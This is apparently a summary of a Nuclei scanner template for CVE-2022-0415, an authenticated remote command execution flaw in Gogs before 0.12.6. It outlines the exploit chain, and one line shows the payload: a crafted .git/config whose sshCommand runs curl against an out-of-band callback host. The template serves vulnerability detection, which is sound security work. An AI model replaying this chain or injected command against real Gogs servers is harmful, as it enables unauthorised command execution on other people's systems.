---
cve_id: CVE-2022-0415
template_path: nuclei-templates/http/cves/2022/CVE-2022-0415.yaml
affected_product: Gogs
severity: high
authentication: required
external_callback: true
affected_versions: <0.12.6
preconditions: [authenticated user with repository creation and upload permissions]
poc_classification: rce
---

## Vulnerability
Gogs before 0.12.6 is susceptible to remote command execution via the uploading repository file in GitHub repository gogs/gogs. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system. Successful exploitation allows remote attackers to execute arbitrary commands on the target system. Fixed in version 0.12.6. CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (score 8.8).

## PoC / Detection
Classification: rce

The template executes a full authenticated exploit chain to verify RCE: GET/POST to `/user/login` (extracts CSRF tokens with supplied username/password), POST to `/repo/create` (creates temporary repo), multipart POST to `/{{username}}/{{randstr}}/upload-file` (uploads crafted `.git/config` containing `sshCommand = curl http://{{interactsh-url}} -I`), and POST to `/_upload/master/` (triggers processing). Detection matches on OOB interactsh callback (dns/http protocol) plus Gogs login page body indicator.

## References
- https://github.com/gogs/gogs/commit/0fef3c9082269e9a4e817274942a5d7c50617284
- https://huntr.dev/bounties/b4928cfe-4110-462f-a180-6d5673797902
- https://nvd.nist.gov/vuln/detail/CVE-2022-0415
- https
